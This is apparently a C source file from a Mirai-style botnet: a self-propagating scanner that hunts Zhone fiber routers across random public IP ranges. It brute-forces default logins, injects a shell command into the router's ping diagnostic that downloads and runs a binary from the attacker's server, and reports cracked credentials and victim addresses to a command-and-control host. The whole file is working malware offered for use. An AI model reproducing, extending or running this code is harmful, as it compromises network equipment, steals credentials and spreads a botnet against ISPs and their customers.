#include "includes.h"
#include "zhone.h"
#include "util.h"
#include "rand.h"

#ifdef SELFREP

/* ============================================================================
 * ZHONE SCANNER - FTTH/ONT Router Exploitation (Improved)
 * ============================================================================
 * Exploits Zhone ONT/OLT fiber routers via ping diagnostic command injection
 * Targets: Zhone equipment with session key authentication
 * Method: GET /zhnping.cmd with session key + command injection in ipAddr parameter
 * Credentials: 6 username/password combinations
 * Payload: /bin/busybox wget to download and execute binary
 * Global coverage: FTTH ISPs with Zhone deployments
 * ============================================================================ */

#define ZHONE_MAX_CONNS 64
#define ZHONE_CONNECTION_TIMEOUT 30
#define ZHONE_READ_TIMEOUT 20
#define ZHONE_WRITE_TIMEOUT 10

/* Connection states */
#define ZHONE_CLOSED 0
#define ZHONE_CONNECTING 1
#define ZHONE_CHECKING_AUTH 2
#define ZHONE_SENDING_LOGIN 3
#define ZHONE_WAITING_LOGIN_RESP 4
#define ZHONE_SENDING_EXPLOIT 5
#define ZHONE_WAITING_EXPLOIT_RESP 6
#define ZHONE_COMPLETE 7

/* Credential structure */
struct zhone_credential {
    char *username;
    char *password;
};

/* Connection structure */
struct zhone_connection {
    int fd;
    uint8_t state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    time_t last_recv;
    time_t connect_time;
    int cred_index;
    BOOL logged_in;
    char username[32];
    char password[32];
    char session_key[64];
    char rdbuf[4096];
    int rdbuf_pos;
};

/* Zhone credentials - matches Python/Go versions */
static struct zhone_credential credentials[] = {
    {"admin", "admin"},
    {"admin", "cciadmin"},
    {"Admin", "Admin"},
    {"user", "user"},
    {"admin", "zhone"},
    {"vodafone", "vodafone"},
    {NULL, NULL}
};

static struct zhone_connection conns[ZHONE_MAX_CONNS];
static void zhone_connect(struct zhone_connection *);
static void zhone_close(struct zhone_connection *);
static void zhone_handle_recv(struct zhone_connection *);
static ipv4_t get_random_ip(void);
static BOOL is_rfc1918(ipv4_t);
static void send_exploit(struct zhone_connection *);
static void report_success(struct zhone_connection *);
static char *base64_encode(const char *input, int input_len);
static char *extract_session_key(const char *response, int len);

void zhone_scanner_init(void) {
    int i;

    if (fork() == 0) {
        /* Initialize connections */
        for (i = 0; i < ZHONE_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = ZHONE_CLOSED;
            conns[i].cred_index = 0;
            conns[i].logged_in = FALSE;
            conns[i].rdbuf_pos = 0;
            conns[i].session_key[0] = '\0';
        }

        srand(time(NULL));

        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            time_t now = time(NULL);

            FD_ZERO(&fdset);

            /* Add all active connections to fdset */
            for (i = 0; i < ZHONE_MAX_CONNS; i++) {
                if (conns[i].state != ZHONE_CLOSED) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }

            tv.tv_sec = 1;
            tv.tv_usec = 0;

            int nfds = select(maxfd + 1, &fdset, NULL, NULL, &tv);

            /* Check for timeouts */
            for (i = 0; i < ZHONE_MAX_CONNS; i++) {
                if (conns[i].state != ZHONE_CLOSED && 
                    (now - conns[i].last_recv > 60 || 
                     now - conns[i].connect_time > 120)) {
                    zhone_close(&conns[i]);
                }
            }

            /* Process readable sockets */
            if (nfds > 0) {
                for (i = 0; i < ZHONE_MAX_CONNS; i++) {
                    if (conns[i].state != ZHONE_CLOSED && 
                        FD_ISSET(conns[i].fd, &fdset)) {
                        zhone_handle_recv(&conns[i]);
                    }
                }
            }

            /* Start new connections */
            for (i = 0; i < ZHONE_MAX_CONNS; i++) {
                if (conns[i].state == ZHONE_CLOSED) {
                    conns[i].dst_addr = get_random_ip();
                    conns[i].dst_port = 80;
                    zhone_connect(&conns[i]);
                    break;
                }
            }

            sleep(1);
        }
    }
}

static void zhone_connect(struct zhone_connection *conn) {
    struct sockaddr_in addr;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));

    conn->state = ZHONE_CONNECTING;
    conn->connect_time = time(NULL);
    conn->last_recv = time(NULL);
    conn->cred_index = 0;
    conn->logged_in = FALSE;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
    conn->session_key[0] = '\0';
}

static void zhone_close(struct zhone_connection *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
    conn->state = ZHONE_CLOSED;
}

/* Simple base64 encoding for HTTP Basic Auth */
static char *base64_encode(const char *input, int input_len) {
    static char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static char output[256];
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    int pos = 0;

    while (input_len--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++) {
                output[pos++] = base64_table[char_array_4[i]];
            }
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++) {
            char_array_3[j] = '\0';
        }

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; j < i + 1; j++) {
            output[pos++] = base64_table[char_array_4[j]];
        }

        while (i++ < 3) {
            output[pos++] = '=';
        }
    }

    output[pos] = '\0';
    return output;
}

/* Extract session key from HTML response */
static char *extract_session_key(const char *response, int len) {
    static char session_key[64];
    const char *start = "var sessionKey='";
    const char *end = "';";
    
    const char *start_pos = util_stristr(response, len, start);
    if (start_pos == NULL) {
        return NULL;
    }
    
    start_pos += strlen(start);
    const char *end_pos = util_stristr(start_pos, len - (start_pos - response), end);
    if (end_pos == NULL) {
        return NULL;
    }
    
    int key_len = end_pos - start_pos;
    if (key_len <= 0 || key_len >= 64) {
        return NULL;
    }
    
    util_strncpy(session_key, start_pos, key_len + 1);
    return session_key;
}

static void zhone_handle_recv(struct zhone_connection *conn) {
    char buf[4096];
    int n;

    n = recv(conn->fd, buf, sizeof(buf), 0);
    if (n <= 0) {
        if (conn->state == ZHONE_COMPLETE) {
            /* Exploit sent successfully */
            if (conn->logged_in) {
                report_success(conn);
            }
        }
        zhone_close(conn);
        return;
    }

    conn->last_recv = time(NULL);

    /* Copy to connection buffer */
    if (conn->rdbuf_pos + n < sizeof(conn->rdbuf) - 1) {
        memcpy(conn->rdbuf + conn->rdbuf_pos, buf, n);
        conn->rdbuf_pos += n;
        conn->rdbuf[conn->rdbuf_pos] = '\0';
    }

    switch (conn->state) {
        case ZHONE_CONNECTING: {
            /* Check connection established */
            int err = 0;
            socklen_t err_len = sizeof(err);
            getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            
            if (err != 0) {
                zhone_close(conn);
                return;
            }

            /* Send HTTP request to check for 401 Unauthorized */
            char check_payload[512];
            int check_len = util_sprintf(check_payload,
                "GET / HTTP/1.1\r\n"
                "Host: %d.%d.%d.%d\r\n"
                "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                "Connection: close\r\n"
                "\r\n",
                (conn->dst_addr >> 24) & 0xFF,
                (conn->dst_addr >> 16) & 0xFF,
                (conn->dst_addr >> 8) & 0xFF,
                conn->dst_addr & 0xFF);

            send(conn->fd, check_payload, check_len, 0);
            conn->state = ZHONE_CHECKING_AUTH;
            break;
        }

        case ZHONE_CHECKING_AUTH: {
            /* Check for 401 Unauthorized with Basic realm */
            if ((util_stristr(conn->rdbuf, conn->rdbuf_pos, "401 Unauthorized") ||
                 util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.1 401")) &&
                util_stristr(conn->rdbuf, conn->rdbuf_pos, "Basic realm=")) {
                
                /* Vulnerable device found, try login */
                conn->cred_index = 0;
                
                /* Send first login attempt */
                if (credentials[conn->cred_index].username != NULL) {
                    char auth_str[64];
                    util_sprintf(auth_str, "%s:%s", 
                        credentials[conn->cred_index].username,
                        credentials[conn->cred_index].password);
                    
                    char *auth_base64 = base64_encode(auth_str, util_strlen(auth_str));
                    
                    char login_payload[1024];
                    int login_len = util_sprintf(login_payload,
                        "GET /zhnping.html HTTP/1.1\r\n"
                        "Host: %d.%d.%d.%d\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                        "Connection: close\r\n"
                        "Referer: http://%d.%d.%d.%d/menu.html\r\n"
                        "Authorization: Basic %s\r\n"
                        "\r\n",
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        auth_base64);

                    send(conn->fd, login_payload, login_len, 0);
                    conn->state = ZHONE_SENDING_LOGIN;
                } else {
                    /* No credentials worked, close */
                    zhone_close(conn);
                }
            } else {
                /* Not vulnerable, close */
                zhone_close(conn);
            }
            break;
        }

        case ZHONE_SENDING_LOGIN:
        case ZHONE_WAITING_LOGIN_RESP: {
            /* Check for successful login (200 OK) */
            if (util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.1 200") ||
                util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.0 200")) {
                
                /* Extract session key */
                char *session_key = extract_session_key(conn->rdbuf, conn->rdbuf_pos);
                
                if (session_key != NULL && util_strlen(session_key) > 0) {
                    /* Login successful with session key */
                    conn->logged_in = TRUE;
                    util_strncpy(conn->username, credentials[conn->cred_index].username, 32);
                    util_strncpy(conn->password, credentials[conn->cred_index].password, 32);
                    util_strncpy(conn->session_key, session_key, 64);
                    
                    /* Send exploit */
                    send_exploit(conn);
                } else {
                    /* Login successful but no session key, try next credential */
                    conn->cred_index++;
                    conn->rdbuf_pos = 0;
                    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
                    
                    if (credentials[conn->cred_index].username != NULL) {
                        /* Try next credential */
                        char auth_str[64];
                        util_sprintf(auth_str, "%s:%s", 
                            credentials[conn->cred_index].username,
                            credentials[conn->cred_index].password);
                        
                        char *auth_base64 = base64_encode(auth_str, util_strlen(auth_str));
                        
                        char login_payload[1024];
                        int login_len = util_sprintf(login_payload,
                            "GET /zhnping.html HTTP/1.1\r\n"
                            "Host: %d.%d.%d.%d\r\n"
                            "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\n"
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                            "Connection: close\r\n"
                            "Referer: http://%d.%d.%d.%d/menu.html\r\n"
                            "Authorization: Basic %s\r\n"
                            "\r\n",
                            (conn->dst_addr >> 24) & 0xFF,
                            (conn->dst_addr >> 16) & 0xFF,
                            (conn->dst_addr >> 8) & 0xFF,
                            conn->dst_addr & 0xFF,
                            (conn->dst_addr >> 24) & 0xFF,
                            (conn->dst_addr >> 16) & 0xFF,
                            (conn->dst_addr >> 8) & 0xFF,
                            conn->dst_addr & 0xFF,
                            auth_base64);

                        send(conn->fd, login_payload, login_len, 0);
                    } else {
                        /* No more credentials, close */
                        zhone_close(conn);
                    }
                }
            } else if (util_stristr(conn->rdbuf, conn->rdbuf_pos, "401 Unauthorized") ||
                       util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.1 401")) {
                
                /* Login failed, try next credential */
                conn->cred_index++;
                conn->rdbuf_pos = 0;
                memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
                
                if (credentials[conn->cred_index].username != NULL) {
                    /* Try next credential */
                    char auth_str[64];
                    util_sprintf(auth_str, "%s:%s", 
                        credentials[conn->cred_index].username,
                        credentials[conn->cred_index].password);
                    
                    char *auth_base64 = base64_encode(auth_str, util_strlen(auth_str));
                    
                    char login_payload[1024];
                    int login_len = util_sprintf(login_payload,
                        "GET /zhnping.html HTTP/1.1\r\n"
                        "Host: %d.%d.%d.%d\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                        "Connection: close\r\n"
                        "Referer: http://%d.%d.%d.%d/menu.html\r\n"
                        "Authorization: Basic %s\r\n"
                        "\r\n",
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        auth_base64);

                    send(conn->fd, login_payload, login_len, 0);
                } else {
                    /* No more credentials, close */
                    zhone_close(conn);
                }
            } else {
                /* Still waiting for response */
                conn->state = ZHONE_WAITING_LOGIN_RESP;
            }
            break;
        }

        case ZHONE_SENDING_EXPLOIT:
        case ZHONE_WAITING_EXPLOIT_RESP: {
            /* Check for successful exploit */
            if (util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.1 200") ||
                util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.0 200") ||
                util_stristr(conn->rdbuf, conn->rdbuf_pos, "/var/pinglog")) {
                
                /* Exploit successful */
                conn->state = ZHONE_COMPLETE;
                if (conn->logged_in) {
                    report_success(conn);
                }
                zhone_close(conn);
            } else {
                /* Wait for response */
                conn->state = ZHONE_WAITING_EXPLOIT_RESP;
            }
            break;
        }

        default:
            zhone_close(conn);
            break;
    }
}

static void send_exploit(struct zhone_connection *conn) {
    char auth_str[64];
    util_sprintf(auth_str, "%s:%s", conn->username, conn->password);
    char *auth_base64 = base64_encode(auth_str, util_strlen(auth_str));
    
    /* Payload command - URL encoded busybox wget */
    /* /bin/busybox wget http://<server>/bins/axis.mips -O /var/g; chmod 777 /var/g; /var/g zhone */
    char payload_encoded[512];
    util_sprintf(payload_encoded,
        "/bin/busybox%%20wget%%20http://%s/bins/axis.mips%%20-O%%20/var/g;%%20chmod%%20777%%20/var/g;%%20/var/g%%20zhone",
        HTTP_SERVER);

    char exploit_payload[2048];
    util_sprintf(exploit_payload,
        "GET /zhnping.cmd?&test=ping&sessionKey=%s&ipAddr=1.1.1.1;%s&count=4&length=64 HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "User-Agent: Mozilla/5.0 (Intel Mac OS X 10.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Edg/81.0.416.72\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Accept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Referer: http://%d.%d.%d.%d/diag.html\r\n"
        "Authorization: Basic %s\r\n"
        "Connection: close\r\n"
        "Upgrade-Insecure-Requests: 1\r\n\r\n",
        conn->session_key,
        payload_encoded,
        (conn->dst_addr >> 24) & 0xFF,
        (conn->dst_addr >> 16) & 0xFF,
        (conn->dst_addr >> 8) & 0xFF,
        conn->dst_addr & 0xFF,
        (conn->dst_addr >> 24) & 0xFF,
        (conn->dst_addr >> 16) & 0xFF,
        (conn->dst_addr >> 8) & 0xFF,
        conn->dst_addr & 0xFF,
        auth_base64);

    send(conn->fd, exploit_payload, util_strlen(exploit_payload), 0);
    conn->state = ZHONE_WAITING_EXPLOIT_RESP;
}

static void report_success(struct zhone_connection *conn) {
    /* Report successful compromise to C&C */
    uint8_t report[128];
    uint32_t addr = conn->dst_addr;
    uint16_t port = htons(conn->dst_port);
    int user_len = util_strlen(conn->username);
    int pass_len = util_strlen(conn->password);

    report[0] = (addr >> 24) & 0xFF;
    report[1] = (addr >> 16) & 0xFF;
    report[2] = (addr >> 8) & 0xFF;
    report[3] = addr & 0xFF;
    report[4] = (port >> 8) & 0xFF;
    report[5] = port & 0xFF;
    report[6] = (uint8_t)user_len;
    memcpy(report + 7, conn->username, user_len);
    report[7 + user_len] = (uint8_t)pass_len;
    memcpy(report + 8 + user_len, conn->password, pass_len);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) return;

    struct sockaddr_in cnc;
    cnc.sin_family = AF_INET;
    cnc.sin_addr.s_addr = inet_addr(CNC_ADDR);
    cnc.sin_port = htons(SCAN_CB_PORT);

    if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
        send(fd, report, 8 + user_len + pass_len, 0);
    }
    close(fd);
}

static ipv4_t get_random_ip(void) {
    ipv4_t addr;

    while (TRUE) {
        addr = rand_next();

        /* Target FTTH/ONT router deployments
         * Focus: ISP fiber networks with Zhone equipment
         * Regions: Latin America, Asia, Middle East, Africa, Europe
         */
        uint8_t first_octet = (addr >> 24) & 0xFF;

        /* Latin America - Major Zhone deployments */
        if (first_octet >= 177 && first_octet <= 201) break;

        /* Asia - Zhone presence */
        if (first_octet >= 101 && first_octet <= 125) break;
        if (first_octet >= 180 && first_octet <= 223) break;

        /* Europe */
        if (first_octet >= 46 && first_octet <= 95) break;

        /* Middle East */
        if (first_octet >= 80 && first_octet <= 95) break;

        /* Africa */
        if (first_octet >= 102 && first_octet <= 197) break;
    }

    return addr;
}

static BOOL is_rfc1918(ipv4_t addr) {
    uint8_t *octets = (uint8_t *)&addr;

    if (octets[0] == 10) return TRUE;
    if (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) return TRUE;
    if (octets[0] == 192 && octets[1] == 168) return TRUE;

    return FALSE;
}

#endif
